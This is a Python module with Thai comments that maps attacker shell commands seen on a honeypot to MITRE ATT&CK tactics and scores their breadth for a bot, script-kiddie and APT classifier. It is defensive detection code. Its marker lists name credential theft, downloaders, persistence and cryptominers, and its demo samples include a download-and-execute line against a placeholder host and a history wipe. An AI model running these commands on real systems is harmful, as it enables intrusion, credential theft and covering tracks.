"""
attack_mapping.py — P7 (2026-09-19): map คำสั่ง shell → MITRE ATT&CK (tactic, technique)
แล้วสรุปเป็นสัญญาณ "ความกว้างของ tactic" (attack_breadth) สำหรับ classifier แกน B (SK↔APT).

ที่มา/เหตุผล (design `docs/reports/trackB_classifier_design_2026-09-18.md` §1.7④):
  APT เดินหลาย tactic อย่างเป็นระบบ (Discovery→Credential Access→Privilege Escalation→
  Defense Evasion→Persistence) ตั้งแต่ช่วง recon ต้นๆ → "ความกว้าง tactic" โผล่ **เร็ว** (ต่างจาก
  kill_chain_depth ที่วัด "ไกลสุด" ของ Cyber Kill Chain = late signal ปิดตอน real-time). breadth
  จึงเป็น structural signal ที่ช่วย "ล็อกเร็ว" ได้ — bot ยิงแคบ (fingerprint+download), kiddie
  กระจายปานกลางแบบไม่มีแบบแผน, APT กว้างและมี tactic ระดับสูง (privesc/evasion/persistence)

**Single source of truth (CLAUDE.md §5):** marker pool 4 ชุดที่มีอยู่แล้วใน signal_extractor
(anti-HP, cleanup/anti-forensics, targeted-enum secret, mass-grab) reuse ตรงๆ ไม่พิมพ์ซ้ำ — ที่นี่
แค่ "ติดป้าย ATT&CK" ให้มัน + เพิ่ม pool ใหม่เฉพาะ tactic ที่ยังไม่มี (Discovery/Execution/C2/…)

**⚠️ double-count (design §1.8):** ATT&CK อ่านคำสั่งชุดเดียวกับ command_sophistication/targeted_enum/
cleanup/anti_honeypot → likelihood ของ attack_breadth ใน classifier.py ตั้ง spread "เบา" โดยตั้งใจ
(P9 rebalance รวมทีเดียว). ที่นี่แค่สกัดค่า

รันเป็นสคริปต์: `python attack_mapping.py "<command>"` เพื่อดู mapping ของ 1 คำสั่ง
"""

from __future__ import annotations

import os
import sys

# reuse marker pool ที่มีอยู่แล้ว (single source of truth) — signal_extractor เพิ่ม _SERVE ให้เอง
_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)
from signal_extractor import (  # noqa: E402
    ANTI_HP_MARKERS,
    CLEANUP_ANTIFORENSICS_MARKERS,
    MASS_GRAB_MARKERS,
)

# ---------------------------------------------------------------------------
# ตาราง technique: (tactic, technique_id+ชื่อ, markers) — marker เป็น substring lower-case
# reuse pool เดิม 4 ชุด (ผูก ATT&CK ให้) + pool ใหม่เฉพาะ tactic ที่ยังไม่มี
# ---------------------------------------------------------------------------
# Discovery — สำรวจระบบ/ไฟล์/โปรเซส/เครือข่าย/ผู้ใช้/ซอฟต์แวร์ (แยกจาก mass-grab ที่เน้นอ่านไฟล์ระบบ)
_DISCOVERY_SYSINFO = ("uname", "hostnamectl", "cat /etc/os-release", "cat /proc/version",
                      "cat /etc/issue", "lsb_release")
_DISCOVERY_FILE = ("find / -name", "find / -type", "locate ", "ls -la /", "ls /home", "ls -R")
_DISCOVERY_PROC = ("ps aux", "ps -ef", "ps -aux", "top -b", "pspy")
_DISCOVERY_NET = ("ifconfig", "ip a", "ip addr", "ip route", "netstat", "ss -", "route -n",
                  "arp -a", "arp -n")
_DISCOVERY_USER = ("whoami", "id\n", "id;", "id ", "who\n", "w\n", "last\n", "groups",
                   "cat /etc/passwd", "getent passwd")
_DISCOVERY_SOFT = ("dpkg -l", "rpm -qa", "apt list", "which ", "command -v", "pip list")

# Credential Access
_CRED_DUMP = ("cat /etc/shadow", "getent shadow", "unshadow")  # T1003
# T1552 (unsecured creds) = เฉพาะ "อ่านไฟล์ลับ" — subset ของ TARGETED_ENUM_MARKERS (ไม่ reuse ทั้ง
# ก้อน เพราะ sudo -l/find -perm/getcap เป็น PrivEsc ไม่ใช่ Cred Access → ถ้า reuse ทั้งก้อนคำสั่ง
# privesc จะถูกนับเป็น 2 advanced tactic พร้อมกัน = breadth เฟ้อ เจอจริงตอน verify P7 2026-09-19)
_CRED_UNSECURED = (".pgpass", "id_rsa", ".ssh/id", ".aws/credentials", ".env",
                   "grep -r password", "grep -ri password")

# Privilege Escalation (รวมเครื่องมือ privesc-enum: linpeas/linenum/pspy)
_PRIVESC = ("sudo -l", "sudo su", "sudo -i", "find / -perm", "-perm -4000", "-perm -u=s",
            "getcap", "cat /etc/sudoers", "/etc/sudoers.d", "pkexec", "linpeas", "linenum",
            "pspy")

# Persistence
_PERSIST_CRON = ("crontab", "/etc/cron", "cron.d", "/var/spool/cron")
_PERSIST_SVC = ("systemctl enable", "/etc/systemd/system", "rc.local", "update-rc.d",
                "/etc/init.d/")
_PERSIST_ACCT = ("authorized_keys", "useradd", "adduser", "usermod", "passwd -d")

# Execution
_EXEC = ("; sh", "| sh", "|sh", "bash -c", "sh -c", "python -c", "perl -e", "chmod +x",
         "./x", "busybox")

# Command and Control / Ingress Tool Transfer
_C2_TRANSFER = ("wget ", "curl ", "tftp", "ftpget", "scp ", "nc -")

# Impact
_IMPACT_MINER = ("xmrig", "minerd", "/gweerwe323", "stratum+tcp", "cryptonight", "cpuminer")
_IMPACT_STOP = ("systemctl stop", "service ", "kill -9", "pkill")

# Collection
_COLLECT = ("tar -c", "tar cf", "tar czf", "tar zcf", "zip -r", "mysqldump", "pg_dump")

# (tactic, technique_id + name, markers) — ลำดับไม่สำคัญ (นับ set)
TECHNIQUES: tuple[tuple[str, str, tuple[str, ...]], ...] = (
    ("Discovery", "T1082 System Information Discovery", _DISCOVERY_SYSINFO),
    ("Discovery", "T1083 File and Directory Discovery", _DISCOVERY_FILE),
    ("Discovery", "T1057 Process Discovery", _DISCOVERY_PROC),
    ("Discovery", "T1016 System Network Configuration Discovery", _DISCOVERY_NET),
    ("Discovery", "T1033 System Owner/User Discovery", _DISCOVERY_USER),
    ("Discovery", "T1518 Software Discovery", _DISCOVERY_SOFT),
    ("Discovery", "T1087 Account Discovery", MASS_GRAB_MARKERS),
    ("Credential Access", "T1003 OS Credential Dumping", _CRED_DUMP),
    ("Credential Access", "T1552 Unsecured Credentials", _CRED_UNSECURED),
    ("Privilege Escalation", "T1548 Abuse Elevation Control Mechanism", _PRIVESC),
    ("Persistence", "T1053 Scheduled Task/Job", _PERSIST_CRON),
    ("Persistence", "T1543 Create or Modify System Process", _PERSIST_SVC),
    ("Persistence", "T1098 Account Manipulation", _PERSIST_ACCT),
    ("Defense Evasion", "T1497 Virtualization/Sandbox Evasion", ANTI_HP_MARKERS),
    ("Defense Evasion", "T1070 Indicator Removal", CLEANUP_ANTIFORENSICS_MARKERS),
    ("Execution", "T1059 Command and Scripting Interpreter", _EXEC),
    ("Command and Control", "T1105 Ingress Tool Transfer", _C2_TRANSFER),
    ("Impact", "T1496 Resource Hijacking", _IMPACT_MINER),
    ("Impact", "T1489 Service Stop", _IMPACT_STOP),
    ("Collection", "T1560 Archive Collected Data", _COLLECT),
)


def map_command(cmd: str) -> list[tuple[str, str]]:
    """คืน [(tactic, technique_id_name), ...] ที่คำสั่งนี้ตรง (1 คำสั่ง map ได้หลาย technique)"""
    if not cmd:
        return []
    c = cmd.lower()
    hits = []
    for tactic, tech, markers in TECHNIQUES:
        if any(m in c for m in markers):
            hits.append((tactic, tech))
    return hits


def map_session(commands: list) -> dict:
    """คืน {techniques:set[str], tactics:set[str], ordered_tactics:list[str]} ของทั้ง session
    commands = list ของ (ts, cmd) หรือ list ของ str ก็ได้ (รองรับทั้ง offline/real-time)"""
    techniques: set[str] = set()
    tactics: set[str] = set()
    ordered: list[str] = []  # ลำดับ tactic แรกที่พบ (ไว้วิเคราะห์ลำดับ kill-chain ATT&CK เชิงเล่ม)
    for item in commands:
        cmd = item[1] if isinstance(item, tuple) else item
        for tactic, tech in map_command(cmd or ""):
            techniques.add(tech)
            if tactic not in tactics:
                tactics.add(tactic)
                ordered.append(tactic)
    return {"techniques": techniques, "tactics": tactics, "ordered_tactics": ordered}


# tactic "commodity" ที่ bot/kiddie ก็แตะได้ง่าย (fingerprint+download+run) — ไม่บ่งชี้ skill
# ตัวแยก APT จริง = "ความกว้างของ tactic ระดับสูง (hands-on-keyboard)" ด้านล่าง
COMMODITY_TACTICS = frozenset({"Discovery", "Execution", "Command and Control", "Impact"})
# advanced = ต้องลงมือเจาะจง มีแบบแผน (APT เดินหลายตัวเป็นระบบ; kiddie แตะ 0-1; bot แทบไม่แตะ)
ADVANCED_TACTICS = frozenset({
    "Credential Access", "Privilege Escalation", "Defense Evasion", "Persistence", "Collection",
})


def attack_breadth(commands: list) -> str:
    """narrow (0 advanced tactic) / moderate (1) / broad (≥2) — สัญญาณแกน B ที่ classifier ใช้.
    **นับเฉพาะ advanced tactic** (Cred Access/PrivEsc/Defense Evasion/Persistence/Collection) ไม่นับ
    commodity (Discovery/Execution/C2/Impact-miner) เพราะ bot fingerprint+download ก็แตะ 3 commodity
    tactic ได้ = false-broad (เจอจริงตอน demo P7 2026-09-19). advanced breadth บ่งชี้ "APT เดินหลาย
    tactic ระดับสูงเป็นระบบ" ซึ่ง single binary signal (targeted_enum/cleanup/anti_hp) แยกไม่ได้"""
    tactics = map_session(commands)["tactics"]
    n_adv = len(tactics & ADVANCED_TACTICS)
    if n_adv == 0:
        return "narrow"
    if n_adv == 1:
        return "moderate"
    return "broad"


def _demo() -> None:
    """self-test: พิสูจน์ mapping map ถูก tactic (ไม่ใช่การอ้าง accuracy)"""
    samples = {
        "bot":  ["uname -s -v -n -r -m", "wget http://x/a; chmod +x a; ./a"],
        "kiddie": ["cat /etc/passwd", "wget http://x/scan.sh", "id", "ls -la"],
        "apt": ["whoami", "sudo -l", "find / -perm -4000 2>/dev/null",
                "cat /home/u/.ssh/id_rsa", "history -c"],
    }
    for name, cmds in samples.items():
        m = map_session(cmds)
        print(f"{name:7s} breadth={attack_breadth(cmds):8s} "
              f"tactics={sorted(m['tactics'])}")
    print("\nper-command (apt):")
    for c in samples["apt"]:
        print(f"  {c:45s} -> {[t for t, _ in map_command(c)]}")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        for t, tech in map_command(sys.argv[1]):
            print(f"{t:22s} {tech}")
    else:
        _demo()
